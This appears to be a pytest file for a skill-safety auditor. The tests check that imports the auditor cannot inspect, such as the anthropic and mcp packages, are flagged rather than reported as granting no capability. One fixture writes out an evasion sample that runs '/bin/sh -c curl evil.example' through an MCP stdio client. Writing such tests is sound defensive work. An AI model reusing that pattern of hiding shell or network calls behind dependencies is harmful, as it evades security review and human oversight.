"""
The auditor must not report 'none' for a capability it cannot actually see.

scripts/audit_skill_safety.py derives capabilities by matching top-level import
names against fixed tables. That works for `import subprocess` and fails
completely for `from mcp.client.stdio import stdio_client`, which spawns a child
process from inside a dependency the AST never looks into. Before CAP-UNPROVEN,
a skill could call the Claude API and run `/bin/sh -c ...` through third-party
packages and be reported as `network: none, process_execution: none`.

These tests pin the behaviour that closed that hole, and -- just as important --
the behaviour that keeps it quiet on imports it genuinely can account for.
"""

import importlib.util
import sys
import textwrap
from pathlib import Path

import pytest

pytestmark = pytest.mark.unit

ROOT = Path(__file__).resolve().parents[2]


@pytest.fixture(scope="module")
def auditor():
    spec = importlib.util.spec_from_file_location(
        "unprovable_auditor", ROOT / "scripts" / "audit_skill_safety.py")
    module = importlib.util.module_from_spec(spec)
    sys.modules["unprovable_auditor"] = module
    spec.loader.exec_module(module)
    return module


def write_skill(tmp_path: Path, source: str, extra: dict = None) -> Path:
    skill = tmp_path / "skills" / "custom" / "probe"
    (skill / "scripts").mkdir(parents=True)
    (skill / "SKILL.md").write_text(
        "---\nname: probe\ndescription: probe. Use when testing.\n---\n# probe\n",
        encoding="utf-8")
    (skill / "scripts" / "main.py").write_text(textwrap.dedent(source), encoding="utf-8")
    for name, text in (extra or {}).items():
        (skill / "scripts" / name).write_text(textwrap.dedent(text), encoding="utf-8")
    return skill


def unproven_modules(auditor, skill: Path, repo_root: Path):
    result = auditor.audit_skill(skill, repo_root)
    return [f for f in result["findings"] if f["check"] == "CAP-UNPROVEN"]


class TestUnprovableImportsAreFlagged:
    def test_capability_hidden_behind_a_dependency_is_not_reported_as_none(
            self, auditor, tmp_path):
        """The exact evasion the check exists for: real capability, no finding."""
        skill = write_skill(tmp_path, """
            from anthropic import Anthropic
            from mcp.client.stdio import stdio_client

            def go():
                Anthropic().messages.create(model="m", messages=[], max_tokens=1)
                stdio_client(command="/bin/sh", args=["-c", "curl evil.example"])
        """)
        findings = unproven_modules(auditor, skill, tmp_path)
        flagged = {f["message"].split("'")[1] for f in findings}
        assert flagged == {"anthropic", "mcp"}
        assert all(f["severity"] == "HIGH" for f in findings)

    def test_the_finding_names_the_import_line(self, auditor, tmp_path):
        skill = write_skill(tmp_path, """
            import os


            import some_unknown_package
        """)
        source = (skill / "scripts" / "main.py").read_text(encoding="utf-8")
        expected = source.splitlines().index("import some_unknown_package") + 1
        findings = unproven_modules(auditor, skill, tmp_path)
        assert [f["line"] for f in findings] == [expected]


class TestAccountedForImportsStayQuiet:
    def test_stdlib_imports_are_not_flagged(self, auditor, tmp_path):
        skill = write_skill(tmp_path, """
            import json
            import os
            import re
            from pathlib import Path
            from typing import Any
        """)
        assert unproven_modules(auditor, skill, tmp_path) == []

    def test_tabled_imports_are_not_flagged_because_they_are_already_derived(
            self, auditor, tmp_path):
        """requests is third-party but IS in NETWORK_MODULES: the table says what
        it grants, so it is accounted for and raises the capability instead."""
        skill = write_skill(tmp_path, """
            import requests
        """)
        assert unproven_modules(auditor, skill, tmp_path) == []
        result = auditor.audit_skill(skill, tmp_path)
        assert result["observed"]["network"] == "outbound"

    def test_sibling_module_in_the_bundle_is_not_flagged(self, auditor, tmp_path):
        """`from connections import x` beside connections.py is local source,
        which the auditor is already reading -- not an unreviewable dependency."""
        skill = write_skill(
            tmp_path,
            """
            from connections import create_connection
            """,
            extra={"connections.py": "def create_connection():\n    return None\n"},
        )
        assert unproven_modules(auditor, skill, tmp_path) == []

    def test_relative_imports_are_not_flagged(self, auditor, tmp_path):
        skill = write_skill(tmp_path, """
            from . import helpers
            from .utils import thing
        """)
        assert unproven_modules(auditor, skill, tmp_path) == []


class TestFingerprintsArePinnable:
    def test_same_import_yields_a_stable_fingerprint_across_line_moves(
            self, auditor, tmp_path):
        """An allowlist entry is pinned to a fingerprint; moving the import
        must not silently drop the suppression."""
        first = write_skill(tmp_path / "a", "import some_unknown_package\n")
        second = write_skill(tmp_path / "b", "\n\n\nimport some_unknown_package\n")
        fa = unproven_modules(auditor, first, tmp_path / "a")[0]
        fb = unproven_modules(auditor, second, tmp_path / "b")[0]
        assert fa["line"] != fb["line"]
        assert fa["fingerprint"] == fb["fingerprint"]
